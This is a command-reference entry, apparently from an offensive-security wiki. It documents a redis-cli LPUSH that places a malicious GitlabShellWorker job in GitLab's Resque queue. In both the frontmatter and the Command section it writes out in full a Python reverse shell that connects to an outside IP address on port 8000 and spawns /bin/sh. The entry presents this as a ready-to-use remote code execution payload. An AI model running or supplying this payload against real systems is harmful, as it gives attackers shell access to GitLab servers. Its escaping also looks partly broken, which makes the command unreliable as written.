---
id: cmd-redis-lpush-payload
data: >-
  lpush resque:gitlab:queue:system_hook_push
  "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3
  -c \\\\import
  socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(\\"118.89.198.146\",8000));os.dup2(s.fileno(),0);
  os.dup2(s.fileno(),1);
  os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\",\\\"-i\\\"]);\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
tags:
  - redis
  - rce-payload
type: command
output: (integer) 1
executor: redis-cli
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T04:09:00.674Z'
verified: false
validated: true
submitted: true
---
---

# redis-lpush-payload

## Command

```bash
redis-cli -h 127.0.0.1 -p 6379 lpush resque:gitlab:queue:system_hook_push "{\"class\":\"GitlabShellWorker\",\"args\":[\"class_eval\",\"open(\'|/usr/bin/python3 -c \\\\import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(\\"118.89.198.146\",8000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\\\"/bin/sh\",\\\"-i\\\"]);\\\\'\').read\"],\"retry\":3,\"queue\":\"system_hook_push\",\"jid\":\"ad52abc5641173e217eb2e52\",\"created_at\":1513714403.8122594,\"enqueued_at\":1513714403.8129568}"
```

## Description

Pushes a JSON job payload to the system_hook_push queue, containing class_eval args for Python RCE reverse shell.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| resque:gitlab:queue:system_hook_push | Queue key | Yes |
| JSON payload | Malicious job string | Yes |

## Examples

### Basic Usage

```bash
redis-cli lpush key "value"
```

### Advanced Usage

Full escaped JSON as in payload.

## Expected Output

(integer) 1

## Related

- [[commands/python-reverse-shell]]
- [[procedures/Inject-CRLF-Payload-in-Mirror-URL]]

